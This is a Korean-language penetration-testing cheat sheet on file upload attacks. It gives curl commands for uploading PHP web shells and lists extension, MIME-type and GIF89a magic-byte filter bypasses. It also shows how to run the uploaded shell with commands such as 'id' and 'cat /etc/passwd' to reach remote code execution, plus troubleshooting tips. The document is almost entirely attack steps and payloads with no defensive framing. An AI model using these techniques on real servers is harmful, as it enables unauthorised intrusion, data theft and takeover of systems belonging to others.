# 파일 업로드 공격

- 파일 업로드 기능에서 웹셸이나 실행 파일을 서버에 심는 공격. 업로드 성공 후 업로드 경로에 직접 접근해 PHP·ASPX 웹셸을 실행해 RCE로 연결한다.
- 프로필 사진·첨부파일·CVS 임포트처럼 업로드 폼이 있는 페이지를 발견했을 때, 웹루트 경로와 검증 우회 방법을 순서대로 시험할 때.
- 업로드 엔드포인트, 업로드된 파일이 저장되는 경로(열거로 확인), 서버 언어(php·aspx·jsp)를 먼저 파악해야 한다. 웹셸은 shells/web-shell/php_webshell.md의 것을 쓴다.

## 기본 테스트 — 정상 파일 업로드부터

```bash
# 1) 정상 이미지 업로드로 성공 응답과 저장 경로 확인
curl -F "file=@normal.png" http://target.com/upload
# 2) 응답에 반환되는 파일 URL을 기록해둔다 (예: /uploads/normal.png)
```

- 검증이 어떻게 동작하는지(확장자·MIME·마법 바이트) 정상 파일이 통과하는 과정에서 추론한다. 이때 저장 경로를 반드시 알아둔다.

## 웹셸 업로드와 확장자 우회

```bash
# 기본 시도
curl -F "file=@shell.php" http://target.com/upload

# 확장자 우회 — 서버 언어에 따라 다른 확장자로
shell.php5      # PHP 5 계열 핸들러
shell.phtml     # Apache가 PHP로 처리하는 확장자
shell.php.jpg   # 정규식 뒷부분만 검사하는 필터
shell.jpg.php   # 앞부분만 검사하는 필터
shell.PhP       # 대소문자 무시 검사가 없는 필터
shell.php.      # 끝의 점이 잘리는 Windows/IIS
```

- 우회 성공 판정: 업로드된 파일에 접근했을 때 PHP 코드가 실행되어 명령 결과가 나온다. 그냥 텍스트로 보이면 처리 핸들러에 등록되지 않은 확장자라는 뜻이다.

## MIME·마법 바이트 우회

```bash
# Content-Type 위장 — 서버가 MIME만 검사할 때
curl -F "file=@shell.php;type=image/png" http://target.com/upload

# 마법 바이트 앞붙이기 — 파일 시그니처 검사 우회
# GIF89a 뒤에 PHP 코드가 오면 image/gif로 인식된다
cat <(echo "GIF89a") shell.php > shell.gif.php
```

- Burp로 요청을 잡아 Content-Type 헤더와 파일 본문을 각각 조작하는 편이 정밀하다.

## 업로드된 웹셸 실행

```bash
# 저장 경로에 직접 접근
curl "http://target.com/uploads/shell.php?cmd=id"
curl "http://target.com/uploads/shell.php5?cmd=cat%20/etc/passwd"
# 브라우저 접근도 동일
# http://target.com/uploads/shell.phtml?cmd=whoami
```

- 웹셸 파라미터 이름(shell.php의 구현에 따라 cmd·c 등)은 웹셸 소스를 확인한다.

## 점검 순서 정리

```text
1. 정상 파일 업로드 -> 저장 경로·응답 형식 파악
2. 서버 언어 확인 (응답 헤더 X-Powered-By, 페이지 확장자, whatweb)
3. 필터 종류 판정: 확장자 블랙/화이트리스트, MIME, 마법 바이트, 내용 검사
4. 우회 조합 시도: 확장자 변형 -> MIME 위장 -> 마법 바이트 -> 대소문자
5. 업로드 성공 -> 웹루트 접근 -> 웹셸 실행 -> RCE
```

## 트러블슈팅

- 업로드는 되는데 웹셸이 실행되지 않으면 uploads 폴더가 PHP를 처리하지 않는다는 뜻이다(Apache 설정). 웹루트를 직접 겨냥할 경로를 찾거나, 실행 가능한 확장자 목록을 더 시험한다.
- `Invalid file type` 같은 클라이언트 측 검사는 Burp로 우회된다. JS 검증은 서버에 도달하기 전에만 동작한다.
- 업로드 경로가 응답에 안 나오면 ffuf·gobuster로 uploads·files·attachments 같은 디렉터리를 탐색해 확인한다.
- 웹셸 실행은 파일명 예측이 막힌 경우(랜덤 파일명) 실패한다. 응답에 파일명이 반환되는지 다시 확인한다.
